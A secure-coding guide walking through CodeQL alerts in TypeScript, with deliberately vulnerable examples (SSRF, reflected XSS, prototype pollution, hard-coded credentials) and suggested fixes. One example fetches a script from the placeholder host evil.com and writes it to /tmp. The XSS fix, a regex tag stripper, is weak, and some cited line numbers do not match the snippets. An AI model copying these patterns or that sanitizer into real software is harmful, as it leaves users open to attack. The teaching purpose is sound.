# CodeQL Best Practices

- CodeQL is the code analysis engine developed by GitHub to automate security checks.

- You can analyze your code using CodeQL and display the results as code scanning alerts.

- CodeQL Scanning Alerts

`Server Side Request Forgery`:

```TypeScript
  import http from 'http';
  import url from 'url';

  var server = http.createServer(function(req, res) {
  var target = url.parse(req.url, true).query.target;

  // BAD: `target` is controlled by the attacker
  http.get('https://' + target + ".example.com/data/", res => {
      // process request response ...
  });

});
```

- When we are trying to use URL's in the `code make sure we are consuming it from config instead of getting from user input`
- If we are consuming it from user input the attacker can append any url whatever he wants as target so that there is a chance of accessing the server
- If we wanted to consume from user input only make sure user input to select a known fixed string before performing the request:

`Best Practice`

```TypeScript
import http from 'http';
import url from 'url';

  var server = http.createServer(function(req, res) {
  var target = url.parse(req.url, true).query.target;

  var subdomain;
  if (target === 'EU') {
      subdomain = "europe"
  } else {
      subdomain = "world"
  }

  // GOOD: `subdomain` is controlled by the server
  http.get('https://' + subdomain + ".example.com/data/", res => {
      // process request response ...
  });
```

});

`Hard Coded Credentials`

```TypeScript
const pg = require("pg");

const client = new pg.Client({
  user: "bob",
  host: "database.server.com",
  database: "mydb",
  password: "correct-horse-battery-staple",
  port: 3211
});
client.connect();
```

- Make sure there is no hard coded credentials or url's in code so that if the code is open source there is a probability we are disclosing the information
- Make sure to get the Url's from `.env`,`config`

`Reflected Cross Side Scripting`

```TypeScript
var app = require('express')();

app.get('/user/:id', function(req, res) {
  if (!isValidUserId(req.params.id))
    // BAD: a request parameter is incorporated without validation into the response
    res.send("Unknown user: " + req.params.id);
  else
    // TODO: do something exciting
    ;
})

```

- When we are consuming data from input and sending the data to response without santizing the input may lead to cross side scripting attacks
- Cross Side Scripting enables the attacker to inject malicious code and make the code run and send it same to the response
- To sanitize the input for example we can use utility like below so that it cleans up script tags and any other html elements and outputs actual input

`Best Pratice`

```TypeScript

export function removeHTMLContent(text: string): string {
  const regexToStripHTML = /<.*>.*?/gi;
  return text.replace(regexToStripHTML, '');
}

```

`Prototype-polluting function`

```TypeScript

function merge(dst, src) {
    for (let key in src) {
        if (!src.hasOwnProperty(key)) continue;
        if (isObject(dst[key])) {
            merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}

```

- When object properties are copied from src to destination we have a threat of prototype pollution
- Object.prototype property can be used to tamper the application logic while properties are copied from source to destination
- if Object.prototype is assigned with empty function or some script which may lead to cross side scripting

`Best Practice`

```TypeScript
function merge(dst, src) {
    for (let key in src) {
        if (!src.hasOwnProperty(key)) continue;
        if (key === "__proto__" || key === "constructor") continue;
        if (isObject(dst[key])) {
            merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}

```

- we need to check the whether object is having that key initially then check whether we have any pollution effect in the keys as in the second condition above

`Unreachable Statement`

```TypeScript
function f() {
	if (someCond());
		return 23;
	return 42;
}

```

```TypeScript
function f() {
	return Promise.resolve({});
	return 42;
}

```

- In the above example, semicolon after the if condition at line 139 makes the return statement on line 4 unreachable: the function will always execute the return statement on line 140 first, so it will never reach line 4.
- To avoid this kind of code we should be careful with return statements and semicolons

```TypeScript
function f() {
	return Promise.resolve({});

}

```

- Remove unreachable code

`Malformed id Attribute`

```TypeScript
<div id="heading important">An important heading</div>
```

- According to the HTML5 standard, the value of the id attribute of an element must contain at least one character, and must not contain any space characters.

```TypeScript
<div id="heading_important">An important heading</div>
```

- In the above example atleast we can remove space or we can use some other character to fill in the space
- And even id attribute should not contain `:` as well because it indicates css selectors
- if the space is not removed it was meant to class attribute

`Useless conditional`

```TypeScript
 {open  && (
   <Button style={{backgroundColor:open ? 'yellow':'green'}}/>
 )}
```

- In the above example we already had a condition when open is true only we are showing the button
- Then backgroundColor is always yellow so there is no chance of green color

```TypeScript
{
  open && (
    <Button style={{backgroundColor:'yellow'}}>
  )
}
```

`Useless assignment to local variable`

```TypeScript
 function f(){
    let x = '100';
    let y ='200'

    if (cond) {
      if (cond) {
        x = '95';
      } else {
        x ='87';
      }
    } else {
      x = '32';
    }
    if (cond) {
      y = '76';
    } else {
      y = '55';
    }
    return {
      x,
      y,
    };
  }
```

- In the above example x and y is having initial values of 100,200 but those values are not used any where before over-riding

```TypeScript
 function f(){
    let x ;
    let y;

    if (cond) {
      if (cond) {
        x = '95';
      } else {
        x ='87';
      }
    } else {
      x = '32';
    }
    if (cond) {
      y = '76';
    } else {
      y = '55';
    }
    return {
      x,
      y,
    };
  }
```

- we can remove the initial values because they are not used anywhere

`Network Data written to a file`

```TypeScript
var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', res => {
  res.on("data", d => {
    fs.writeFileSync("/tmp/script", d)
  })
})
```

- Storing user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base

- Before storing data to local file system try to validate the response if you are not sure about the source and then add data to local files

- Code QL Useful Links
- `https://codeql.github.com/codeql-query-help/javascript/` all the best practices for all javascript issues
- `https://docs.github.com/en/code-security` Go to code scanning to check overall set up of codeQL
